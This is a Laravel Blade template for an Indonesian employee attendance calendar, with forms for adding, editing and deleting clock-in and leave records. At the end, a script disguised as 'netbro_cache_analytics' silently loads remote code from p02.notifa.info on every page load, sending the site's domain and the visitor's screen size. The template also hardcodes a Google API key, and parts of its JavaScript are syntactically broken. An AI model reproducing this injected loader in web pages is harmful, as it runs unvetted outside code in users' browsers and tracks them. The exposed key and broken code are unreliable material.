<!DOCTYPE html>
<html lang="en">
<head>
  <!-- CSS -->

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Presensi</title>
  <link rel="stylesheet" type="text/css" href="/assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="/assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <link rel="stylesheet" type="text/css" href="/assets/css/float_button.css">
  <link rel="stylesheet" href="/assets/css/presensi.css" type="text/css"/>
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
  <!-- Toastr untuk notifikasi -->
  <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">
  <!-- fullcalendar -->
  <link rel='stylesheet' href='/assets/lib/jquery.fullcalendar/fullcalendar.min.css' />
</head>
<body>
  <!-- Wrapper Start -->
  <div class="be-wrapper">

    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End --> 
    <!-- Konten -->
    <div class="be-content">
      <div class="page-head">
        <h2 class="page-head-title">Kalender Presensi</h2>
        <ol class="breadcrumb page-head-nav">
          <li><a href="/presensi">Presensi</a></li>
          <li class="active">Edit Kalender Presensi</li>
        </ol>
      </div>
      <div class="main-content container-fluid">
        <div class="panel panel-default panel-table">
          <div class="panel-body">
            <div class="modal-body">
              <div class="table-responsive noSwipe">

                <!--Data calendar Presensi-->
                <div class="panel panel-default panel-table">
                  <div class="panel-heading"><h2>Kalender Presensi</h2>
                    <div style="width: 100%; overflow: hidden;">
                      <div style="width: 600px; float: left;">
                        <table>
                          <tbody>
                            <tr>
                              <td style="font-size: 15px;">Nik</td>
                              <td style="font-size: 15px;">: {{$data_karyawan->nik}}</td>
                            </tr>
                            <tr>
                              <td style="font-size: 15px;">ID_SJ</td>
                              <td style="font-size: 15px;">: {{$data_karyawan->id_sidik_jari}}</td>
                            </tr>
                            <tr>
                              <td style="font-size: 15px;">Nama Karyawan</td>
                              <td style="font-size: 15px;">: {{$data_karyawan->nama_karyawan}}</td>
                            </tr>
                            <tr>
                              <td style="font-size: 15px;">Divisi</td>
                              <td style="font-size: 15px;">: {{$data_karyawan->divisi}}</td>
                            </tr>   
                          </tbody>
                        </table>
                      </div>
                      <div style="margin-left: 620px;">
                        <br>
                        <br>
                        <br>
                        <br>
                        <br>
                        <button style="float: right;"  data-toggle="modal" data-target="#modal_hapus_data" type="submit" class="btn btn-space btn-danger">Hapus Data</button>
                        <button style="float: right;"  data-toggle="modal" data-target="#modal_tambah_absen" type="submit" class="btn btn-space btn-primary">Tambah Absen</button>
                        <button style="float: right;"  data-toggle="modal" data-target="#modal_tambah_presensi" type="submit" class="btn btn-space btn-primary">Tambah Presensi</button>
                        <!-- The Modal Presensi-->
                        <div class="modal fade" id="modal_hapus_data">
                          <div class="modal-dialog colored-header-primary">
                            <div class="modal-content">

                              <!-- Modal Header -->
                              <div class="modal-header">
                               <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                               <h4 style="color: white; margin-top: 20px;" class="modal-title">Hapus Presensi/Absen</h4>
                             </div>

                             <form id="form_hapus" name="submit3" action="/presensi/calendar/hapus_presensi_absen" method="POST">
                              @csrf
                              <!-- Modal body -->
                              <div class="modal-body">
                                <div class="form-group">
                                  <label for="usr">Tanggal Presensi</label><br>
                                  <input type="date" class="form-control" name="tanggal_presensi" required="">
                                </div>
                                <input value="{{$data_karyawan->id_sidik_jari}}" name="id_sidik_jari" type="hidden" required="">
                              </div>

                              <!-- Modal footer -->
                              <div class="modal-footer">
                                <button type="button" class="btn btn-default" data-dismiss="modal">Batal</button>
                                <button type="submit4" class="btn btn-danger">Hapus</button>
                              </div>
                            </form>

                          </div>
                        </div>
                      </div>
                      <!-- End The Modal Clock IN-->
                      <!-- The Modal Presensi-->
                      <div class="modal fade" id="modal_tambah_absen">
                        <div class="modal-dialog colored-header-primary">
                          <div class="modal-content">

                            <!-- Modal Header -->
                            <div class="modal-header">
                             <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                             <h4 style="color: white; margin-top: 20px;" class="modal-title">Tambah Absen</h4>

                           </div>

                           <form id="form_jam_clock_in" name="submit3" action="/presensi/calendar/tambah_absen" method="POST">
                            @csrf
                            <!-- Modal body -->
                            <div class="modal-body">
                              <div class="form-group">
                                <label for="usr">Tanggal Presensi</label><br>
                                <input type="date" class="form-control" name="tanggal_presensi" required="">
                              </div>
                              <div class="form-group">
                                <label>Tipe Izin</label><br>
                                <select class="form-control" name="tipe_izin" required="">
                                  <option value="">- Pilih -</option>
                                  <option value="Cuti">Cuti</option>
                                  <option value="Cuti Penting">Cuti Penting</option> 
                                  <option value="Dinas Luar">Dinas Luar</option>
                                  <option value="Dispensasi">Dispensasi</option>
                                  <option value="Izin">Izin</option>
                                  <option value="SDSD">SDSD</option>
                                  <option value="STSD">STSD</option>
                                  <option value="Telat">Telat</option>
                                </select>
                              </div>
                              <div class="form-group">
                                <label>Alasan</label><br>
                                <textarea name="alasan_izin" class="form-control" required=""></textarea>
                              </div>
                              <input value="{{$data_karyawan->id_sidik_jari}}" name="id_sidik_jari" type="hidden" required="">
                            </div>

                            <!-- Modal footer -->
                            <div class="modal-footer">
                              <button type="button" class="btn btn-default" data-dismiss="modal">Batal</button>
                              <button type="submit4" class="btn btn-primary">Simpan</button>
                            </div>
                          </form>

                        </div>
                      </div>
                    </div>
                    <!-- End The Modal Clock IN-->
                    <!-- The Modal Presensi-->
                    <div class="modal fade" id="modal_tambah_presensi">
                      <div class="modal-dialog colored-header-primary">
                        <div class="modal-content">

                          <!-- Modal Header -->
                          <div class="modal-header">
                            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                            <h4 style="color: white; margin-top: 20px;" class="modal-title">Tambah Presensi</h4>

                          </div>

                          <form id="form_jam_clock_in" name="submit3" action="/presensi/calendar/tambah_presensi" method="POST">
                            @csrf
                            <!-- Modal body -->
                            <div class="modal-body">
                              <div class="form-group">
                                <label>Tanggal Presensi</label><br>
                                <input type="date" class="form-control" name="tanggal_presensi" required="">
                              </div>
                              <div class="form-group">
                                <label for="usr">Jam Clock In ( Format: 00:00:00 )</label><br>
                                <input type="text" class="form-control" name="jam_clock_in" required="">
                              </div>
                              <div class="form-group">
                                <label for="pwd">Info Clock In</label><br>
                                <input type="text" class="form-control" name="info_clock_in" >
                              </div>
                              <div class="form-group">
                                <label for="usr">Jam Clock Out ( Format: 00:00:00 )</label><br>
                                <input type="text" class="form-control" name="jam_clock_out" required="">
                              </div>
                              <div class="form-group">
                                <label for="pwd">Info Clock Out</label><br>
                                <input type="text" class="form-control" name="info_clock_out" id="info_clock_out">
                              </div>
                              <div>
                                <select name="mode" class="form-control" required="">
                                  <option value="">-Pilih Mode Bulan-</option>
                                  <option value="Normal" >Bulan Biasa</option>
                                  <option value="Ramadhan" >Bulan Ramadhan</option>
                                </select>
                              </div>
                              <input value="{{$data_karyawan->id_sidik_jari}}" name="id_sidik_jari" type="hidden">
                            </div>

                            <!-- Modal footer -->
                            <div class="modal-footer">
                              <button type="button" class="btn btn-default" data-dismiss="modal">Batal</button>
                              <button type="submit3" class="btn btn-primary">Simpan</button>
                            </div>
                          </form>

                        </div>
                      </div>
                    </div>
                    <!-- End The Modal Clock IN-->
                  </div>
                </div>
              </div>
            </div>
            <div class="panel-body">
              <div class="table-responsive noSwipe">
                <div class="modal-body ">
                 <div class="table-responsive noSwipe">
                  <div id='calendar'></div>

                  <!-- The Modal Presensi-->
                  <div class="modal fade" id="modal_edit_presensi">
                    <div class="modal-dialog colored-header-primary">
                      <div class="modal-content">

                        <!-- Modal Header -->
                        <div class="modal-header">
                          <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                          <h4 style="color: white; margin-top: 20px;" class="modal-title">Edit Presensi Kalender</h4>
                        </div>

                        <form id="form_jam_clock_in" name="submit3" action="/presensi/calendar/update_presensi" method="POST">
                          @csrf
                          <!-- Modal body -->
                          <div class="modal-body">
                            <div class="form-group">
                              <label for="usr">Jam Clock In ( Format: 00:00:00 )</label><br>
                              <input type="text" class="form-control" name="jam_clock_in" id="jam_clock_in">
                            </div>
                            <div class="form-group">
                              <label for="pwd">Info Clock In</label><br>
                              <input type="text" class="form-control" name="info_clock_in" id="info_clock_in">
                            </div>
                            <div class="form-group">
                              <label for="usr">Jam Clock Out ( Format: 00:00:00 )</label><br>
                              <input type="text" class="form-control" name="jam_clock_out" id="jam_clock_out">
                            </div>
                            <div class="form-group">
                              <label for="pwd">Info Clock Out</label><br>
                              <input type="text" class="form-control" name="info_clock_out" id="info_clock_out">
                            </div>
                            <div>
                              <select name="mode" class="form-control" required="">
                                <option value="">-Pilih Mode-</option>
                                <option value="Normal" >Bulan Biasa</option>
                                <option value="Ramadhan" >Bulan Ramadhan</option>
                              </select>
                            </div>
                            <div  style="margin-top: 13%;" class="form-group">
                              <label for="usr">Late ( Format: 0.0 )</label><br>
                              <input type="text" class="form-control" name="late_presensi" id="late_presensi">
                            </div>
                            <div class="form-group">
                              <label for="pwd">Info Late</label><br>
                              <input type="text" class="form-control" name="info_late_presensi" id="info_late_presensi">
                            </div>
                            <div class="form-group">
                              <label for="usr">Early ( Format : 0.0 )</label><br>
                              <input type="text" class="form-control" name="early_presensi" id="early_presensi">
                            </div>
                            <div class="form-group">
                              <label for="pwd">Info Early</label><br>
                              <input type="text" class="form-control" name="info_early_presensi" id="info_early_presensi">
                            </div>
                            <input type="hidden" class="form-control" name="tanggal_presensi" id="tanggal">
                            <input type="hidden" class="form-control" name="id_presensi" id="id_presensi">
                            <input value="{{$data_karyawan->id_sidik_jari}}" name="id_sidik_jari" type="hidden">
                          </div>

                          <!-- Modal footer -->
                          <div class="modal-footer">
                           <button type="button" class="btn btn-default" data-dismiss="modal">Tutup</button>
                           <button type="submit1" class="btn btn-primary">Simpan</button>

                         </div>
                       </form>

                     </div>
                   </div>
                 </div>
                 <!-- End The Modal Clock IN-->
                 <!-- The Modal Presensi-->
                 <div class="modal fade" id="modal_edit_izin">
                  <div class="modal-dialog colored-header-primary">
                    <div class="modal-content">

                      <!-- Modal Header -->
                      <div class="modal-header">
                        <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                        <h4 style="color: white; margin-top: 20px;" class="modal-title">Keterangan Absen</h4>                        
                      </div>

                      <form id="form_jam_clock_in" name="submit3" action="/presensi/calendar/update_absen" method="POST">
                        @csrf
                        <!-- Modal body -->
                        <div class="modal-body">
                          <div class="form-group">
                            <label for="usr">Keterangan Format (Tipe Izin : Alasan)</label><br>
                            <input type="text" class="form-control" name="keterangan_presensi" id="keterangan_presensi">
                          </div>
                          <input type="hidden" class="form-control" name="id_presensi" id="id_presensi_">
                          <input type="hidden" class="form-control" name="tanggal_presensi" id="tanggal_">
                          <input value="{{$data_karyawan->id_sidik_jari}}" name="id_sidik_jari" type="hidden" required="">
                        </div>

                        <!-- Modal footer -->
                        <div class="modal-footer">  
                          <button type="button" class="btn btn-default" data-dismiss="modal">Batal</button>
                          <button type="submit2" class="btn btn-primary">Simpan</button>
                        </div>
                      </form>

                    </div>
                  </div>
                </div>
                <!-- End The Modal Clock IN-->
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>


</div>
</div>
</div>
</div>


<!--   Content End  -->

<!--Footer -->

<div class="text-center">
  <div class="credits">
    <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
  </div>
</div>

<!-- Script Toastr untuk notifikasi-->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script>
  @if (Session::has('message'))
  var type = "{{Session::get('alert-type','info')}}";
  toastr.options = {
    "debug": false,
    "onclick": null,
    "fadeIn": 300,
    "fadeOut": 1000,
    "timeOut": 5000,
    "extendedTimeOut": 1000
  }

  switch(type)
  {
    case 'info':
    toastr.info("{{Session::get('message')}}");
    break;

    case 'success':
    toastr.success("{{Session::get('message')}}");
    break;

    case 'warning':
    toastr.warning("{{Session::get('message')}}");
    break;

    case 'error':
    toastr.error("{{Session::get('message')}}");
    break;
  }

  @endif

</script>

<!--  Inisialisasi Java Script -->

<script src="/assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="/assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="/assets/js/main.js" type="text/javascript"></script>
<script src="/assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>

<script src='https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.17.1/moment.min.js'></script>
<script src='/assets/lib/jquery.fullcalendar/fullcalendar.min.js''></script>
<script>
  $(document).ready(function() {
        // page is now ready, initialize the calendar...
        $('#calendar').fullCalendar({
            // put your options and callbacks here
            String, default: 'Asia/Jakarta',

            plugins: [ 'dayGrid', 'list', 'googleCalendar' ],

            views: {
              Month: { buttonText: 'Month' },
            },
            
            header: {

              left: 'prev,next',
              center: 'title',
              right: ' ',
            },

            googleCalendarApiKey: 'AIzaSyBD9KYNVKvAygptb_es3bkm3b4z03fPlF4',

            displayEventTime: false,

            events : [

            @foreach($data_presensi as $data)
            {
              id: '{{ $data->id_presensi }}',
              title : '@if( $data->keterangan_presensi == null) {{  $data->jam_clock_in . ', ' .$data->info_clock_in . ',\n' . $data->jam_clock_out . ', '.$data->info_clock_out .',\n' . $data->late_presensi . ', ' .$data->info_late_presensi . ',\n' . $data->early_presensi. ', ' .$data->info_early_presensi }} @else {{ $data->keterangan_presensi }} @endif',
              start : '{{ $data->tanggal_presensi }}',
              end: '{{ $data->tanggal_presensi }}',
            },
            @endforeach
            ],

            eventClick: function(event, element, jsEvent, view) {
              var id  = event.id;
              var str = event.title;
              var dat = new Date (event.start);
              var bln = dat.getMonth()+1;
              if(bln < 10 ){
                var bulan = "0"+bln;
              } else {
                var bulan = bln;
              }
              var date = dat.getFullYear()+"-"+bulan+"-"+dat.getDate();
              var res = str.split(",");

              if (res[1] == null) {

                $('#id_presensi_').val(id);
                $('#keterangan_presensi').val(res[0]);
                $('#tanggal_').val(date);
                $('#modal_edit_izin').modal();

              }else{

                $('#id_presensi').val(id);
                $('#jam_clock_in').val(res[0]);
                $('#info_clock_in').val(res[1]);
                $('#jam_clock_out').val(res[2]);
                $('#info_clock_out').val(res[3]);
                $('#late_presensi').val(res[4]);
                $('#info_late_presensi').val(res[5]);
                $('#early_presensi').val(res[6]);
                $('#info_early_presensi').val(res[7]);
                $('#tanggal').val(date);
                $('#modal_edit_presensi').modal();
              }

            }
            
          });
      });
    </script>

    <script type="text/javascript">

    // Fungsi Menu dashboard

    $(document).ready(function(){

      App.init();
      App.dashboard();

    });
  </script>

  <script type="text/javascript">
    if (self == top) {
      function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
          fn();
          callback();
        }, 0);
      }

      function sync(fn) {
        fn();
      }

      function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
      }
      netbro_cache_analytics(requestCfs, function() {});
    };

  </script>

</body>
</html>
